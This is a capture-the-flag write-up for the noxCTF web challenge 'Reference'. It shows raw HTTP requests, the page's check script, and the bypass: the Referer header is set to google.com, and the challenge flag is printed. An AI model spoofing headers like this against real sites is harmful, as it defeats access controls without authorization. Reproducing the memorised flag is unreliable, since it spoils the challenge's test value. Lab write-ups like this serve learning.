# **Reference**

#### tag : web

-----------------------------------------------

#### Description

>What is your reference again?
>
>http://chal.noxale.com:5000


-----------------------------------------------

#### Solution

Link is just simple site checking referer site is google or not.

~~~

GET / HTTP/1.1
Host: chal.noxale.com:5000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=MvzfvW4ZpJb3GS3Z16YCLR1pdkfVeBk6TBZrWf7HBheXieydWjoL17OGgHoC7O6u
If-None-Match: "flask-1536165887.0-1291-1563297874"
If-Modified-Since: Wed, 05 Sep 2018 16:44:47 GMT
Connection: close

~~~

There is checking script.

~~~

$( document ).ready(function() {
    $.ajax({
        url: "check_from_google",
        data: NaN,
        success: function(result) {
            $("#status").html("hello old friend! " + atob(result))        
        },
        dataType: NaN
    }).fail(function() {
        $("#status").html("where the **** did you come from?")
    });
});

~~~

Deafult request,

~~~

GET /check_from_google HTTP/1.1
Host: chal.noxale.com:5000
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
Referer: http://chal.noxale.com:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=MvzfvW4ZpJb3GS3Z16YCLR1pdkfVeBk6TBZrWf7HBheXieydWjoL17OGgHoC7O6u
Connection: close

~~~

Well, I change `Referer` header to google's url and I can get flag.

~~~

GET /check_from_google HTTP/1.1
Host: chal.noxale.com:5000
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
Referer: http://www.google.com
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=MvzfvW4ZpJb3GS3Z16YCLR1pdkfVeBk6TBZrWf7HBheXieydWjoL17OGgHoC7O6u
Connection: close

~~~

**noxCTF{G0ogL3_1s_4lW4Ys_Ur_b3ST_R3f3r3nc3}**
